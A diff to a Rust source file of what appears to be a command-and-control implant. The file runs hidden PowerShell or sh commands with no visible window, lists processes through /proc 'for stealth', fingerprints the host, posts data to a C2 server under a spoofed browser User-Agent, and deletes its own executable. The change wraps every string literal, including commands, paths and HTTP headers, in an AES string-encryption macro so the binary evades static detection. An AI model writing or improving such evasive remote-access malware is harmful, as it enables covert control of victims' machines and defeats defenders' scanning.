@@ -2,6 +2,8 @@
 use uuid::Uuid;
 use sha2::{Sha256, Digest};
 use std::process::Command;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 // ── Shell spawn helper - keeps Windows-only API entirely off Linux/macOS ────
 
@@ -16,8 +18,8 @@ fn spawn_shell(cmd: &str) -> std::io::Result<std::process::Child> {
     // DETACHED_PROCESS, which severs stdout/stderr pipe inheritance and causes
     // the child to produce no output even when Stdio::piped() is set.
     const CREATE_NO_WINDOW: u32 = 0x0800_0000;
-    Command::new("powershell")
-        .args(["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", cmd])
+    Command::new(aes_str!("powershell"))
+        .args([aes_str!("-NoProfile"), aes_str!("-NonInteractive"), aes_str!("-WindowStyle"), aes_str!("Hidden"), aes_str!("-Command"), cmd.to_string()])
         .stdout(std::process::Stdio::piped())
         .stderr(std::process::Stdio::piped())
         .creation_flags(CREATE_NO_WINDOW)
@@ -26,8 +28,8 @@ fn spawn_shell(cmd: &str) -> std::io::Result<std::process::Child> {
 
 #[cfg(not(target_os = "windows"))]
 fn spawn_shell(cmd: &str) -> std::io::Result<std::process::Child> {
-    Command::new("sh")
-        .args(["-c", cmd])
+    Command::new(aes_str!("sh"))
+        .args([aes_str!("-c"), cmd.to_string()])
         .stdout(std::process::Stdio::piped())
         .stderr(std::process::Stdio::piped())
         .spawn()
@@ -63,9 +65,9 @@ pub fn get_persistent_id() -> String {
         machine_uid::get().unwrap_or_else(|_| {
             // Deterministic fallback: SHA256 of hostname so Docker/CI environments
             // produce the same ID on repeated calls even without a machine-uid source.
-            let hostname = sys_info::hostname().unwrap_or_else(|_| "unknown-host".to_string());
+            let hostname = sys_info::hostname().unwrap_or_else(|_| aes_str!("unknown-host"));
             let mut h = Sha256::new();
-            h.update(b"persistent-id-fallback:");
+            h.update(aes_str!("persistent-id-fallback:").as_bytes());
             h.update(hostname.as_bytes());
             let r = h.finalize();
             Uuid::from_slice(&r[0..16]).unwrap_or_else(|_| Uuid::new_v4()).to_string()
@@ -94,7 +96,7 @@ pub fn generate_exe_id(salt: &str) -> String {
             Err(_) => {
                 // Can't even get our path - use a deterministic ID from machine UID
                 // instead of a random UUID that would change every check-in.
-                return format!("fallback-{}", get_persistent_id());
+                return format!("{}{}", aes_str!("fallback-"), get_persistent_id());
             }
         };
         
@@ -196,8 +198,10 @@ pub fn execute_shell_command_timeout(cmd: &str, timeout: std::time::Duration) ->
                     let mut combined = stdout.trim().to_string();
                     if !combined.is_empty() { combined.push_str("\n\n"); }
                     combined.push_str(&format!(
-                        "[Timed out after {}s — killed. Use 'bg <cmd>' for long-running tasks.]",
-                        timeout.as_secs()
+                        "{}{}{}",
+                        aes_str!("[Timed out after "),
+                        timeout.as_secs(),
+                        aes_str!("s — killed. Use 'bg <cmd>' for long-running tasks.]")
                     ));
                     return (combined, stderr.trim().to_string(), -1);
                 }
@@ -216,14 +220,14 @@ pub fn get_process_list() -> String {
     #[cfg(target_os = "linux")]
     {
         // Native /proc parsing for stealth (avoids spawning 'ps')
-        if let Ok(entries) = fs::read_dir("/proc") {
+        if let Ok(entries) = fs::read_dir(aes_str!("/proc")) {
             for entry in entries.flatten() {
                 let path = entry.path();
                 if path.is_dir() {
                     if let Some(file_name) = path.file_name() {
                         if let Some(name_str) = file_name.to_str() {
                             if name_str.chars().all(char::is_numeric) {
-                                let comm_path = path.join("comm");
+                                let comm_path = path.join(aes_str!("comm"));
                                 if let Ok(comm) = fs::read_to_string(comm_path) {
                                     results.push_str(&format!("{}|{}\n", name_str, comm.trim()));
                                 }
@@ -289,7 +293,7 @@ pub fn get_process_list() -> String {
 
     #[cfg(target_os = "macos")]
     {
-        let output = Command::new("ps").args(["-eo", "pid,comm"]).output();
+        let output = Command::new(aes_str!("ps")).args([aes_str!("-eo"), aes_str!("pid,comm")]).output();
         if let Ok(o) = output {
              let stdout = String::from_utf8_lossy(&o.stdout);
              for line in stdout.lines().skip(1) {
@@ -302,7 +306,7 @@ pub fn get_process_list() -> String {
     }
 
     if results.is_empty() {
-        return "0|No processes found".to_string();
+        return aes_str!("0|No processes found");
     }
 
     results
@@ -319,24 +323,29 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
     let body_len = data.len();
     
     let request = format!(
-        "POST {} HTTP/1.1\r\n\
-         Host: {}\r\n\
-         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\
-         Content-Type: application/json\r\n\
-         Content-Length: {}\r\n\
-         Connection: keep-alive\r\n\
+        "{} {} {}\r\n\
+         {}: {}\r\n\
+         {}: {}\r\n\
+         {}: {}\r\n\
+         {}: {}\r\n\
+         {}: {}\r\n\
          \r\n",
-        safe_path, safe_host, body_len
+        aes_str!("POST"), safe_path, aes_str!("HTTP/1.1"),
+        aes_str!("Host"), safe_host,
+        aes_str!("User-Agent"), aes_str!("Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
+        aes_str!("Content-Type"), aes_str!("application/json"),
+        aes_str!("Content-Length"), body_len,
+        aes_str!("Connection"), aes_str!("keep-alive")
     );
 
     // 2. Send Headers
     if let Err(e) = stream.write_all(request.as_bytes()).await {
-        return Err(format!("Send headers failed: {}", e));
+        return Err(format!("{}: {}", aes_str!("Send headers failed"), e));
     }
 
     // 3. Send Body
     if let Err(e) = stream.write_all(data).await {
-        return Err(format!("Send body failed: {}", e));
+        return Err(format!("{}: {}", aes_str!("Send body failed"), e));
     }
     
     let _ = stream.flush().await;
@@ -353,24 +362,24 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
     // Phase 1: Read until we find \r\n\r\n
     loop {
         if tokio::time::Instant::now() > deadline {
-            return Err("HTTP response exceeded total deadline".to_string());
+            return Err(aes_str!("HTTP response exceeded total deadline"));
         }
         // Use the sooner of per-read timeout and overall deadline
         let read_deadline = deadline.min(tokio::time::Instant::now() + http_read_timeout());
         match tokio::time::timeout_at(read_deadline, stream.read(&mut tmp)).await {
-            Ok(Ok(0)) => return Err("EOF reading headers".to_string()),
+            Ok(Ok(0)) => return Err(aes_str!("EOF reading headers")),
             Ok(Ok(n)) => {
                 recv_buf.extend_from_slice(&tmp[..n]);
                 if recv_buf.len() > 16384 {
-                    return Err("Response headers too large".to_string());
+                    return Err(aes_str!("Response headers too large"));
                 }
                 if let Some(pos) = recv_buf.windows(4).position(|w| w == b"\r\n\r\n") {
                     header_end = pos + 4;
                     break;
                 }
             }
-            Ok(Err(e)) => return Err(format!("Read failed: {}", e)),
-            Err(_) => return Err("Timeout reading response headers".to_string()),
+            Ok(Err(e)) => return Err(format!("{}: {}", aes_str!("Read failed"), e)),
+            Err(_) => return Err(aes_str!("Timeout reading response headers")),
         }
     }
 
@@ -380,7 +389,7 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
 
     // Parse Content-Length and Transfer-Encoding from response headers
     let content_len: Option<usize> = header_str.lines()
-        .find(|l| l.to_lowercase().starts_with("content-length:"))
+        .find(|l| l.to_lowercase().starts_with(aes_str!("content-length:").as_str()))
         .and_then(|l| l.split(':').nth(1))
         .and_then(|v| v.trim().parse::<usize>().ok());
 
@@ -391,7 +400,7 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
         .any(|l| {
             let lower = l.to_lowercase();
             let trimmed = lower.trim_start();
-            trimmed.starts_with("transfer-encoding:") && trimmed.contains("chunked")
+            trimmed.starts_with(aes_str!("transfer-encoding:").as_str()) && trimmed.contains(aes_str!("chunked").as_str())
         });
 
     fn max_response() -> usize { crate::config::config().agent.http_max_response_bytes as usize }
@@ -412,15 +421,15 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
                 match tokio::time::timeout(http_read_timeout(), stream.read(&mut tmp2)).await {
                     Ok(Ok(0)) => return Ok(decoded_body),
                     Ok(Ok(n)) => chunk_buf.extend_from_slice(&tmp2[..n]),
-                    Ok(Err(e)) => return Err(format!("Read chunk size: {}", e)),
-                    Err(_) => return Err("Timeout reading chunk size".to_string()),
+                    Ok(Err(e)) => return Err(format!("{}: {}", aes_str!("Read chunk size"), e)),
+                    Err(_) => return Err(aes_str!("Timeout reading chunk size")),
                 }
-                if chunk_buf.len() - cursor > max_response() { return Err("Chunk buffer overflow".into()); }
+                if chunk_buf.len() - cursor > max_response() { return Err(aes_str!("Chunk buffer overflow")); }
             }
 
             let crlf_pos = match chunk_buf[cursor..].windows(2).position(|w| w == b"\r\n") {
                 Some(pos) => cursor + pos,
-                None => return Err("Chunked: expected CRLF but not found".into()),
+                None => return Err(aes_str!("Chunked: expected CRLF but not found")),
             };
             let size_str = String::from_utf8_lossy(&chunk_buf[cursor..crlf_pos]).trim().to_string();
             cursor = crlf_pos + 2;
@@ -428,24 +437,24 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
             let size_hex = size_str.split(';').next().unwrap_or("").trim();
             let chunk_size = match usize::from_str_radix(size_hex, 16) {
                 Ok(n) => n,
-                Err(_) => return Err(format!("Malformed chunk size: '{}'", size_str)),
+                Err(_) => return Err(format!("{}: '{}'", aes_str!("Malformed chunk size"), size_str)),
             };
             if chunk_size == 0 { break; }
             if chunk_size > max_response() {
-                return Err(format!("Single chunk size {} exceeds limit", chunk_size));
+                return Err(format!("{} {} {}", aes_str!("Single chunk size"), chunk_size, aes_str!("exceeds limit")));
             }
             if decoded_body.len().checked_add(chunk_size).unwrap_or(usize::MAX) > max_response() {
-                return Err(format!("Chunked response exceeds {} bytes", max_response()));
+                return Err(format!("{} {} {}", aes_str!("Chunked response exceeds"), max_response(), aes_str!("bytes")));
             }
 
             let need = chunk_size + 2; // data + \r\n
             while chunk_buf.len() - cursor < need {
                 let mut tmp2 = [0u8; 4096];
                 match tokio::time::timeout(http_read_timeout(), stream.read(&mut tmp2)).await {
-                    Ok(Ok(0)) => return Err("EOF in chunk data".into()),
+                    Ok(Ok(0)) => return Err(aes_str!("EOF in chunk data")),
                     Ok(Ok(n)) => chunk_buf.extend_from_slice(&tmp2[..n]),
-                    Ok(Err(e)) => return Err(format!("Read chunk: {}", e)),
-                    Err(_) => return Err("Timeout reading chunk data".to_string()),
+                    Ok(Err(e)) => return Err(format!("{}: {}", aes_str!("Read chunk"), e)),
+                    Err(_) => return Err(aes_str!("Timeout reading chunk data")),
                 }
             }
             decoded_body.extend_from_slice(&chunk_buf[cursor..cursor + chunk_size]);
@@ -463,7 +472,7 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
 
     if let Some(len) = content_len {
         if len > max_response() {
-            return Err(format!("Response too large: {} bytes", len));
+            return Err(format!("{}: {} {}", aes_str!("Response too large"), len, aes_str!("bytes")));
         }
         // body already has preamble bytes; read the rest
         while body.len() < len {
@@ -471,8 +480,8 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
             match tokio::time::timeout(http_read_timeout(), stream.read(&mut tmp2)).await {
                 Ok(Ok(0)) => break,
                 Ok(Ok(n)) => body.extend_from_slice(&tmp2[..n]),
-                Ok(Err(e)) => return Err(format!("Read body failed: {}", e)),
-                Err(_) => return Err("Timeout reading response body".to_string()),
+                Ok(Err(e)) => return Err(format!("{}: {}", aes_str!("Read body failed"), e)),
+                Err(_) => return Err(aes_str!("Timeout reading response body")),
             }
         }
         body.truncate(len);
@@ -485,11 +494,11 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
                 Ok(Ok(0)) => break,
                 Ok(Ok(n)) => {
                     if body.len() + n > max_response() {
-                        return Err(format!("Response exceeds {} byte limit (no Content-Length)", max_response()));
+                        return Err(format!("{} {} {}", aes_str!("Response exceeds"), max_response(), aes_str!("byte limit (no Content-Length)")));
                     }
                     body.extend_from_slice(&tmp2[..n]);
                 }
-                Ok(Err(e)) => return Err(format!("Read failed: {}", e)),
+                Ok(Err(e)) => return Err(format!("{}: {}", aes_str!("Read failed"), e)),
                 Err(_) => break, // Timeout on EOF-based read = assume complete
             }
         }
@@ -512,7 +521,7 @@ pub fn self_destruct() -> ! {
         // and execute arbitrary PowerShell commands. Doubling single quotes
         // ('') is PowerShell's escape mechanism inside single-quoted strings.
         let path = current_exe.to_string_lossy().replace('\'', "''");
-        let cmd = format!("Start-Sleep -Seconds 3; Remove-Item -Path '{}' -Force", path);
+        let cmd = format!("{} '{}' {}", aes_str!("Start-Sleep -Seconds 3; Remove-Item -Path"), path, aes_str!("-Force"));
         
         let _ = spawn_shell(&cmd);
     }
@@ -602,14 +611,14 @@ fn get_ifaces_linux() -> Vec<crate::common::NetworkInterface> {
     // `ip -o addr show` prints one address per line:
     //   2: eth0 inet 192.168.1.5/24 brd 192.168.1.255 scope global eth0
     //   2: eth0 inet6 fe80::1/64 scope link
-    let (out, _, _) = execute_shell_command("ip -o addr show 2>/dev/null");
+    let (out, _, _) = execute_shell_command(aes_str!("ip -o addr show 2>/dev/null").as_str());
 
     // Collect addresses per interface name, then read flags from sysfs
     let mut map: HashMap<String, Vec<String>> = HashMap::new();
     for line in out.lines() {
         let cols: Vec<&str> = line.split_whitespace().collect();
         // cols[1] = name, cols[2] = inet/inet6, cols[3] = addr/prefix
-        if cols.len() >= 4 && (cols[2] == "inet" || cols[2] == "inet6") {
+        if cols.len() >= 4 && (cols[2] == aes_str!("inet").as_str() || cols[2] == aes_str!("inet6").as_str()) {
             let name = cols[1].trim_end_matches(':').to_string();
             map.entry(name).or_default().push(cols[3].to_string());
         }
@@ -624,9 +633,9 @@ fn get_ifaces_linux() -> Vec<crate::common::NetworkInterface> {
 /// Read IFF_* flag names from /sys/class/net/<name>/flags (hex bitmask).
 #[cfg(target_os = "linux")]
 fn read_linux_flags(name: &str) -> Vec<String> {
-    let path = format!("/sys/class/net/{}/flags", name);
+    let path = format!("{}/{}/{}", aes_str!("/sys/class/net"), name, aes_str!("flags"));
     let raw  = std::fs::read_to_string(&path).unwrap_or_default();
-    let hex  = raw.trim().trim_start_matches("0x");
+    let hex  = raw.trim().trim_start_matches(aes_str!("0x").as_str());
     let bits = u32::from_str_radix(hex, 16).unwrap_or(0);
 
     // Standard Linux IFF_* bits (from <net/if.h>)
@@ -652,7 +661,7 @@ fn get_ifaces_macos() -> Vec<crate::common::NetworkInterface> {
     //   en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
     //       inet 192.168.1.5 netmask 0xffffff00 broadcast 192.168.1.255
     //       inet6 fe80::1%en0 prefixlen 64 scopeid 0x4
-    let (out, _, _) = execute_shell_command("ifconfig -a 2>/dev/null");
+    let (out, _, _) = execute_shell_command(aes_str!("ifconfig -a 2>/dev/null").as_str());
 
     let mut map: HashMap<String, (Vec<String>, Vec<String>)> = HashMap::new();
     let mut current = String::new();
@@ -668,7 +677,7 @@ fn get_ifaces_macos() -> Vec<crate::common::NetworkInterface> {
             }
         } else if !current.is_empty() {
             let trimmed = line.trim();
-            if trimmed.starts_with("inet6 ") {
+            if trimmed.starts_with(aes_str!("inet6 ").as_str()) {
                 let parts: Vec<&str> = trimmed.split_whitespace().collect();
                 if parts.len() >= 4 {
                     let addr  = parts[1].split('%').next().unwrap_or(parts[1]);
@@ -676,12 +685,12 @@ fn get_ifaces_macos() -> Vec<crate::common::NetworkInterface> {
                     map.entry(current.clone()).or_default().0
                        .push(format!("{}/{}", addr, pfx));
                 }
-            } else if trimmed.starts_with("inet ") {
+            } else if trimmed.starts_with(aes_str!("inet ").as_str()) {
                 let parts: Vec<&str> = trimmed.split_whitespace().collect();
                 if parts.len() >= 4 {
                     let addr = parts[1];
                     // netmask is hex: 0xffffff00 -> 24 bits
-                    let hex  = parts[3].trim_start_matches("0x");
+                    let hex  = parts[3].trim_start_matches(aes_str!("0x").as_str());
                     let mask = u32::from_str_radix(hex, 16).unwrap_or(0);
                     let pfx  = mask.count_ones();
                     map.entry(current.clone()).or_default().0
@@ -712,8 +721,8 @@ fn get_ifaces_windows() -> Vec<crate::common::NetworkInterface> {
     use std::collections::HashMap;
 
     // PowerShell returns a JSON array of address objects
-    let ps = "Get-NetIPAddress | Select-Object InterfaceAlias,IPAddress,PrefixLength | ConvertTo-Json -Compress";
-    let (out, _, _) = execute_shell_command(ps);
+    let ps = aes_str!("Get-NetIPAddress | Select-Object InterfaceAlias,IPAddress,PrefixLength | ConvertTo-Json -Compress");
+    let (out, _, _) = execute_shell_command(&ps);
 
     let mut map: HashMap<String, Vec<String>> = HashMap::new();
     if let Ok(val) = serde_json::from_str::<serde_json::Value>(out.trim()) {
@@ -722,9 +731,9 @@ fn get_ifaces_windows() -> Vec<crate::common::NetworkInterface> {
             obj => vec![obj.clone()],  // single object (only one address)
         };
         for item in arr {
-            let name   = item["InterfaceAlias"].as_str().unwrap_or("unknown").to_string();
-            let addr   = item["IPAddress"].as_str().unwrap_or("").to_string();
-            let prefix = item["PrefixLength"].as_u64().unwrap_or(24);
+            let name   = item[aes_str!("InterfaceAlias").as_str()].as_str().unwrap_or(aes_str!("unknown").as_str()).to_string();
+            let addr   = item[aes_str!("IPAddress").as_str()].as_str().unwrap_or("").to_string();
+            let prefix = item[aes_str!("PrefixLength").as_str()].as_u64().unwrap_or(24);
             if !addr.is_empty() {
                 map.entry(name).or_default().push(format!("{}/{}", addr, prefix));
             }
@@ -736,7 +745,7 @@ fn get_ifaces_windows() -> Vec<crate::common::NetworkInterface> {
         crate::common::NetworkInterface {
             name,
             addresses,
-            flags: vec!["UP".to_string(), "RUNNING".to_string()],
+            flags: vec![aes_str!("UP"), aes_str!("RUNNING")],
         }
     }).collect()
 }
